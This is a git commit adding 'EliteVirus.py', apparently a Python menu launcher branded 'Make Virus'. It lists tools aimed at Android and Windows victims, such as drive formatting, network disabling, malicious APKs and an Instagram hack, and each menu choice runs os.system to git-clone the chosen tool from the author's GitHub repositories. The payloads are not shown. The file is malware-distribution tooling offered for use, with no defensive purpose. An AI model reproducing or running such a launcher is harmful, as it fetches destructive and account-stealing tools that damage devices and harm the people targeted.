4cb4fbb8b239769b1f46273b42b7b655163ab698
MehdiAlion-tech <78682822+MehdiAlion-tech@users.noreply.github.com>
2021-02-12 03:13:59 +0330

    Add files via upload

---
+++ EliteVirus.py
@@ -0,0 +1,81 @@
+import os
+os.system("clear")
+red='\033[31m'
+blue='\033[36m'
+rang='\033[34m'
+pink='\033[35m'
+green='\033[32m'
+zard='\033[33m'
+print(f"{green} ")
+print("\t            .-****-.       .-****-. ")
+print("\t           /        \     /        \ ")
+print("\t          /_        _\   /_        _\ ")
+print("\t         // \      / \\  // \      / \\ ")
+print("\t         |\__\    /__/| |\__\    /__/| ")
+print("\t          \    ||    /   \    ||    / ")
+print("\t           \        /     \        / ")
+print("\t            \  __  /       \  __  / ")
+print("\t    .-****-. *.__.*.-****-. *.__.*.-****-. ")
+print("\t   /        \ |  |/        \ |  |/        \ ")
+print("\t  /_        _\|  /_        _\|  /_        _\ ")
+print("\t // \      / \\  // \      / \\  // \      / \\")
+print("\t |\__\    /__/| |\__\    /__/| |\__\    /__/|")
+print("\t  \    ||    /   \    ||    /   \    ||    / ")
+print("\t   \        /     \        /     \        / ")
+print("\t    \  __  /       \  __  /       \  __  / ")
+print("\t     *.__.*         *.__.*         *.__.* ")
+print("\t      |  |           |  |           |  | ")
+print("\t      |  |           |  |           |  | ")
+print(f"{red} ")
+print(" __  __    __    _  _  ____    _  _  ____  ____  __  __  ___ ")
+print("(  \/  )  /__\  ( )/ )( ___)  ( \/ )(_  _)(  _ \(  )(  )/ __) ")
+print(" )    (  /(__)\  )  (  )__)    \  /  _)(_  )   / )(__)( \__ \ ")
+print("(_/\/\_)(__)(__)(_)\_)(____)    \/  (____)(_)\_)(______)(___/ ")
+print(f"{green} ")
+print("◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇ ")
+print(f"{pink} ")
+print("\tTelegram : @Persian_Elite ")
+print("\tYouTube  : YouTube.com/PersianElite ")
+print(f"{green} ")
+print("◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇ ")
+print(f"{red} ")
+print("\t< Android >\t\t< Windows > ")
+print(f"{rang} ")
+print("\t♧ 1 ♧ Format\t\t♧ 2 ♧ FormatC ")
+print(f"{rang} ")
+print("\t♧ 3 ♧ Angry\t\t♧ 4 ♧ NoNet ")
+print(f"{rang} ")
+print("\t♧ 5 ♧ DApk\t\t♧ 6 ♧ NoNet 2 ")
+print(f"{rang} ")
+print("\t♧ 7 ♧ BadApk\t\t♧ 8 ♧ CDdrive ")
+print(f"{rang} ")
+print("\t♧ 9 ♧ VsFcbook\t\t♧ 10 ♧ Cumdone ")
+print(f"{rang} ")
+print("\t♧ 11 ♧ Dndroid\t\t♧ 12 ♧ Exit ")
+print(f"{blue} ")
+Elite = int(input("< ∆ > choose >>> : "))
+if Elite == 1:
+    os.system("git clone https://github.com/MehdiAlion/Apk ")
+elif Elite == 2:
+    os.system("git clone https://github.com/MehdiAlion-tech/FormatC")
+elif Elite == 4:
+    os.system("git clone https://github.com/MehdiAlion-tech/NoNet ")
+elif Elite == 3:
+    os.system("git clone https://github.com/MehdiAlion-tech/Angry ")
+elif Elite == 5:
+    os.system("git clone https://github.com/MehdiAlion-tech/InstaHack ")
+elif Elite == 6:
+    os.system("git clone https://github.com/MehdiAlion-tech/NoNet2 ")
+elif Elite == 7:
+    os.system("git clone https://github.com/MehdiAlion-tech/BadApk ")
+elif Elite == 8:
+    os.system("git clone https://github.com/MehdiAlion-tech/CDdrive ")
+elif Elite == 10:
+    os.system("git clone https://github.com/MehdiAlion-tech/CumDone ")
+elif Elite == 9:
+    os.system("git clone https://github.com/MehdiAlion-tech/Vsfcbook ")
+elif Elite == 11:
+    os.system("git clone https://github.com/MehdiAlion-tech/Denroid ")
+elif Elite == 12:
+    os.system("clear")
+    os.system("figlet PersianElite")
